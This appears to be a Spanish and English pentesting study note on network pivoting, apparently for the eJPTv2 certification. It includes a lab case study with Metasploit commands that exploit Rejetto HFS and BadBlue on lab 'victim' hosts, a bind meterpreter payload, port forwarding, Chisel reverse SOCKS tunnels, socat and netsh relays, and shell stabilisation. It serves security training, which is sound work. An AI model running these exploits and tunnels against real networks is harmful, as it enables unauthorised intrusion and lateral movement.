# Pivoting in Cybersecurity

## Introduction
Pivoting is an essential technique in the world of cybersecurity that involves moving laterally within a compromised network to access additional systems and resources. This technique is used by security professionals to maintain and expand access across a compromised infrastructure.

## What is Pivoting?
In simple terms, pivoting refers to the action of using a compromised machine as an entry point to access other systems within the network. This technique is particularly useful when access has been gained to a perimeter system and one is looking to infiltrate deeper network segments.

## Types of Pivoting
There are several types of pivoting depending on how the lateral movement is performed:

- **Direct Pivoting:** It is performed from the compromised machine to other systems within the same network.
- **Pivoting Across Jumps:** Involves moving across multiple engaged machines to reach the desired goal.
- **Chain Pivoting:** This involves connecting several compromised systems to reach the target network.
  
## Tools and Techniques
To carry out pivoting, security professionals use specific tools and techniques, such as:

- **SSH Tunneling:** Establish secure connections over SSH to redirect traffic.
- **Proxychains:** Routing traffic through a chain of proxies.
- **Port Forwarding:** Port redirection to access internal services.
- **VPN and Socks:** Use of VPN or SOCKS servers to hide the origin of traffic.

## Importance in Cybersecurity
Pivoting is a crucial skill for security analysts and pentesters, as it allows them to understand the breadth of a breach and assess potential exposure on a compromised network. It also helps identify and remediate potential entry points and lateral movement in future attacks.

## Case Study

![Pivoting](https://github.com/khansiddique/pentesting-repo-notes/blob/main/Images/pivoting.png) 


```python
Victim Machine 1 : 10.4.20.196
Victim Machine 2 : 10.4.20.195
nmap -sV 10.4.20.196
//tiene una vulnerabilidad en 80/tcp    open  http               HttpFileServer httpd 2.3
use exploit/windows/http/rejetto_hfs_exec
set rhosts 10.4.20.196
ipconfig
//Interface 12 vemos lo siguiente
IPv4 Address : 10.4.20.196
IPv4 Netmask : 255.255.240.0
//debemos de establecer un ruteo para leer otras IP
run autoroute -s 10.4.20.0/20
background (ahora si guardamos la sesión)
use auxiliary/scanner/portscan/tcp (para escanear puertos)
set rhosts 10.4.20.195 (IP target 2)
set PORTS 1-100
run
//veremos algo como esto
[+] 10.4.20.195:          - 10.4.20.195:80 - TCP OPEN
//retornamos a la sesion para hacer un port foward
session 1
portfwd add -l 1234 -p 80 -r 10.4.20.195 (IP del target 2)
portfwd list (para validar)
//sin cerrar metasploit ejecutamos los siguiente en una terminal
nmap -sV -sS -p 1234 localhost
1234/tcp open  http    BadBlue httpd 2.7
//hay una vulnerabalidad para eso
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS 10.4.20.195 (IP del objetivo 2)
run
background
session
(veremos 2 sesiones !!)
```

## Chisel

```python
./chisel server --reverse -p 1234 (servidor - tu equipo)
./chisel client 192.168.1.41:1234 R:socks (cliente - víctima)
./chisel client 10.10.0.128:2111 R:8888:socks (segundo cliente - víctima)
```

## Socat

```python
./socat TCP-LISTEN:4343,fork TCP:192.168.1.41:8080
```

## Proxychains

```python
socks5  127.0.0.1 8888
socks5  127.0.0.1 1080
```

## Netsh - Socat en Windows

```python
netsh interface portproxy add v4tov4 listenport=8787 listenaddress=0.0.0.0 connectport=8788 connectaddress=192.168.100.128
```

Toma en cuenta lo siguiente, conforme vas aumentando los clientes con el chisel, el puerto debe de ir en el proxychains y lo pones encima del último que has agregado como se muestra en el ejemplo proporcionado.

## Pivoting con Metasploit

```python
run autoroute -s IP/24 (meterpreter)
route add [red de destino] [máscara de subred] [sesión] (metasploit , en caso no tengas sesión de meterpreter)
use auxiliary/server/socks_proxy
socks4 IP 1080 (proxychains)
```

## Interactive console

```python
script /dev/null -c bash
control + z
stty raw -echo; fg
reset xterm
export TERM=xterm
```



## Reference

1. https://github.com/khansiddique/eJPTV2-Notas-Comandos-Cheats/blob/main/EJPTv2/Post%20Exploitation/pivoting.md
2. https://raw.githubusercontent.com/khansiddique/eJPTV2-Notas-Comandos-Cheats/refs/heads/main/EJPTv2/Post%20Exploitation/pivoting.md
